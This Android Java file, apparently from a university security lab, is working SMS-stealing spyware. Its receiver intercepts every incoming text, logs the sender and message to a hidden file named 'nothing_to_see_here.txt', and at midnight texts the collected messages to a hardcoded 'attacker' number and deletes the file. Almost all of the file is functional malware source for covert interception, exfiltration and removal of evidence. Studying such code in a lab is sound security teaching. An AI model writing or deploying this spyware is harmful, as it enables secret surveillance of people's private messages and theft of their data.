package cps633.lab4_ps2_06;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

// Class used to listen for incoming SMS Messages and AlarmManager intents
public class SMSReceiver extends BroadcastReceiver{

    String senderNum;
    String message;

    public void onReceive(Context context, Intent intent) {

        //if intent received is for SMS
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {

            // Retrieves a map of extended data from the intent.
            final Bundle bundle = intent.getExtras();

            try {
                if (bundle != null) {

                   /*
                    *  To Andrei: Why cast bundle.get as Object[]?
                    *  Well:
                    *
                    *  A PDU is a "protocol description unit", which is the industry format for an SMS message.
                    *  SMSMessage reads and writes them.
                    *  A large message might be broken into many tiny pieces, which is why it's an array of objects.
                    */

                    final Object[] pdusObj = (Object[]) bundle.get("pdus");

                    //Go through each pdu object and compile the message out of them
                    for (Object aPdusObj : pdusObj) {

                        //currentMessage now contains all the details of the SMS message
                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);

                        senderNum = currentMessage.getDisplayOriginatingAddress(); //get phone number of the sender
                        message = currentMessage.getDisplayMessageBody(); //get the message body

                        //Put it all together in one string
                        String data = "Sender Num: " + senderNum + " Message: " + message + " ";

                        //Write message to a file inside cps633.lab4_ps2_06 folder in /sdcard/Android/data
                        writeToFile(data, context);
                    }
                }
            } catch (Exception e) {
                Log.e("SmsReceiver", "Exception  smsReceiver" + e);
            }
        }

        //If intent received is for the scheduled AlarmManager
        if(intent.getAction().equals("AlarmStuff")){
            getMessage(context);
        }
    }

    //This method handles sending the SMS to the attacker at midnight
    private void getMessage(Context context) {
        String filename = context.getExternalCacheDir().getAbsolutePath()+"/nothing_to_see_here.txt";
        String content = "";

        //Create file object
        File file = new File(filename);

        //Grab file content and save into a string
        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                content += line + "\n";
            }
            bufferedReader.close();

            Log.d("sendingMessage", content);

            //Call sendSMS to send SMS with message content to attacker
            sendSMS(content);

            //Delete file
            file.getCanonicalFile().delete();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    //This method is for writing the logged messages to a file on the phone
    private void writeToFile(String data, Context context) throws IOException {
        try {
                String baseFolder = context.getExternalCacheDir().getAbsolutePath();

                File file = new File(baseFolder + "/nothing_to_see_here.txt");
                file.getParentFile().mkdirs();

                FileOutputStream fos = new FileOutputStream(file, true);

                fos.write(data.getBytes());
                fos.flush();
                fos.close();
        }
        catch (Exception e) {
            Log.e("writeToFile", "Exception writeToFile" + e);
            e.printStackTrace();
        }
    }

    //This is the general method for sending an SMS
    public static void sendSMS(String content) {
        Log.d("sendSMS", "Sending a SMS now!");
        String attackerNum = "+XXXXXXXXXX";
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(attackerNum, null, content, null, null);

        } catch (Exception e) {
            Log.e("sendSMS", "SMS failed");
            e.printStackTrace();
        }
    }
}